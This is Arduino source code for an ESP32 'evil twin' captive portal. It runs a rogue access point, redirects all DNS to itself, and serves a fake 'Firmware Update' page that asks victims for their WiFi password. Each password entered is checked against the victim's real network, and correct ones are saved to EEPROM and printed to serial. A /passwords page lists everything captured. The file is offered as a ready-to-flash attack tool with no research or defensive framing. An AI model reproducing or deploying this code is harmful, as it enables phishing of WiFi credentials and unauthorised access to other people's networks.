#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <EEPROM.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>

#define SCREEN_WIDTH 128  // OLED display width, in pixels
#define SCREEN_HEIGHT 64  // OLED display height, in pixels
#define OLED_RESET -1     // Reset pin # (or -1 if sharing Arduino reset pin)
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#ifndef LED_BUILTIN
#define LED_BUILTIN 2  // Assuming the built-in LED is on pin 2, adjust if necessary
#endif

// Default SSID name
const char* SSID_NAME = "ugly-duckling";

// Default main strings
#define SUBTITLE ""
#define TITLE "Firmware Update"
#define BODY "Your router firmware is out of date. Update your firmware to continue browsing normally."
#define POST_TITLE "Updating..."
#define POST_BODY "Your router is being updated. Please wait until the process finishes.</br>Thank you."
#define PASS_TITLE "Passwords"
#define CLEAR_TITLE "Cleared"

// Init system settings
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(192, 168, 4, 1);

String allPass = "";
String newSSID = "";
String currentSSID = "";

// For storing passwords in EEPROM.
int initialCheckLocation = 20;  
int passStart = 30;             
int passEnd = passStart;        

unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
}

String header(String t) {
  String a = String(currentSSID);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>"
             + a + " :: " + t + "</title>"
                                "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
                                "<style>"
             + CSS + "</style>"
                     "<meta charset=\"UTF-8\"></head>"
                     "<body><nav><b>"
             + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post><label>WiFi password:</label>" + "<input type=password name=m></input><input type=submit value=Submit></form>" + footer();
}

// Function to attempt connection to the victim's AP
bool tryToConnectWiFi(String password) {
  WiFi.begin(currentSSID.c_str(), password.c_str()); 
  unsigned long startAttemptTime = millis();


  while (WiFi.status() != WL_CONNECTED && millis() - startAttemptTime < 10000) {
    delay(100);
  }

  return WiFi.status() == WL_CONNECTED; 
}

// New function to check password and stop fake AP if correct
String checkPassword(String enteredPassword) {
  if (tryToConnectWiFi(enteredPassword)) {
    
    WiFi.softAPdisconnect(true); 

    // Save the valid password to EEPROM
    for (int i = 0; i <= enteredPassword.length(); ++i) {
      EEPROM.write(passEnd + i, enteredPassword[i]);  
    }

    passEnd += enteredPassword.length();  
    EEPROM.write(passEnd, '\0');          
    EEPROM.commit();                      

    Serial.print("Correct Password: ");
    Serial.println(enteredPassword); //serial print of correct password

    return header("Password Correct") + "<p>Password is correct. The fake AP is now stopped. ESP is now connected to the real AP.</p>" + footer();
  } else {
    // Incorrect password, stay in loop and ask for re-entry
    return header("Incorrect Password") + "<p>The password you entered is incorrect. Please try again.</p>" +
           "<form action=/post method=post><label>WiFi password:</label><input type=password name=m></input>" +
           "<input type=submit value=Submit></form>" + footer();
  }
}


String posted() {
  String pass = input("m");
  pass = "<li><b>" + pass + "</li></b>";  // Adding password in an ordered list.
  allPass += pass;                        // Updating the full passwords.


  for (int i = 0; i <= pass.length(); ++i) {
    EEPROM.write(passEnd + i, pass[i]);  // Adding password to existing password in EEPROM.
  }

  passEnd += pass.length();  // Updating end position of passwords in EEPROM.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(POST_TITLE) + POST_BODY + footer();
}

String pass() {
  return header(PASS_TITLE) + "<ol>" + allPass + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String ssid() {
  return header("Change SSID") + "<p>Here you can change the SSID name. After pressing the button \"Change SSID\" you will lose the connection, so reconnect to the new SSID.</p>" + "<form action=/postSSID method=post><label>New SSID name:</label>" + "<input type=text name=s></input><input type=submit value=\"Change SSID\"></form>" + footer();
}

String postedSSID() {
  String postedSSID = input("s");
  newSSID = "<li><b>" + postedSSID + "</b></li>";
  for (int i = 0; i < postedSSID.length(); ++i) {
    EEPROM.write(i, postedSSID[i]);
  }
  EEPROM.write(postedSSID.length(), '\0');
  EEPROM.commit();
  WiFi.softAP(postedSSID);
  return header("Posted SSID") + newSSID + footer();
}

String clear() {
  allPass = "";
  passEnd = passStart;  // Setting the password end location -> starting position.
  EEPROM.write(passEnd, '\0');
  EEPROM.commit();
  return header(CLEAR_TITLE) + "<div><p>The password list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINK() {  // The built-in LED will blink 5 times after a password is posted.
  for (int counter = 0; counter < 10; counter++) {
    // For blinking the LED.
    digitalWrite(LED_BUILTIN, counter % 2);
    delay(500);
  }
}

void setup() {
  // Serial begin
  Serial.begin(115200);

  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {  // Address 0x3C for 128x64
    Serial.println(F("SSD1306 allocation failed"));
    for (;;)
      ;
  }
  display.display();
  delay(2000);  // Pause for 2 seconds

  display.clearDisplay();
  display.setTextSize(1);               // Normal 1:1 pixel scale
  display.setTextColor(SSD1306_WHITE);  // Draw white text
  display.setCursor(0, 0);              // Start at top-left corner

  bootTime = lastActivity = millis();
  EEPROM.begin(512);
  delay(10);

  // Check whether the ESP is running for the first time.
  String checkValue = "first";  // This will be set in EEPROM after the first run.

  for (int i = 0; i < checkValue.length(); ++i) {
    if (char(EEPROM.read(i + initialCheckLocation)) != checkValue[i]) {
      // Add "first" in initialCheckLocation.
      for (int i = 0; i < checkValue.length(); ++i) {
        EEPROM.write(i + initialCheckLocation, checkValue[i]);
      }
      EEPROM.write(0, '\0');          // Clear SSID location in EEPROM.
      EEPROM.write(passStart, '\0');  // Clear password location in EEPROM
      EEPROM.commit();
      break;
    }
  }

  // Read EEPROM SSID
  String ESSID;
  int i = 0;
  while (EEPROM.read(i) != '\0') {
    ESSID += char(EEPROM.read(i));
    i++;
  }

  // Reading stored password and end location of passwords in the EEPROM.
  while (EEPROM.read(passEnd) != '\0') {
    allPass += char(EEPROM.read(passEnd));  // Reading the stored password in EEPROM.
    passEnd++;                              // Updating the password end location.
  }

  currentSSID = ESSID;
  if (ESSID == "") {
    ESSID = SSID_NAME;
    currentSSID = SSID_NAME;
  }
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ESSID);

  Serial.println(WiFi.softAPIP());

  dnsServer.start(DNS_PORT, "*", APIP);
  webServer.on("/", []() {
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.on("/post", HTTP_POST, []() {
    String pass = input("m");
    webServer.send(HTTP_CODE, "text/html", checkPassword(pass));  // Check password against the victim's AP
    BLINK();
  });
  webServer.on("/passwords", []() {
    webServer.send(HTTP_CODE, "text/html", pass());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.on("/ssid", []() {
    webServer.send(HTTP_CODE, "text/html", ssid());
  });
  webServer.on("/postSSID", HTTP_POST, []() {
    webServer.send(HTTP_CODE, "text/html", postedSSID());
    delay(3000);  // Give 3 sec delay before resetting the ESP.
    ESP.restart();
  });

  webServer.onNotFound([]() {
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(LED_BUILTIN, OUTPUT);
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (millis() - lastTick >= TICK_TIMER) {
    tickCtr++;
    lastTick = millis();
  }
  if (millis() - lastActivity > 600000UL) {
    ESP.restart();
  }
}
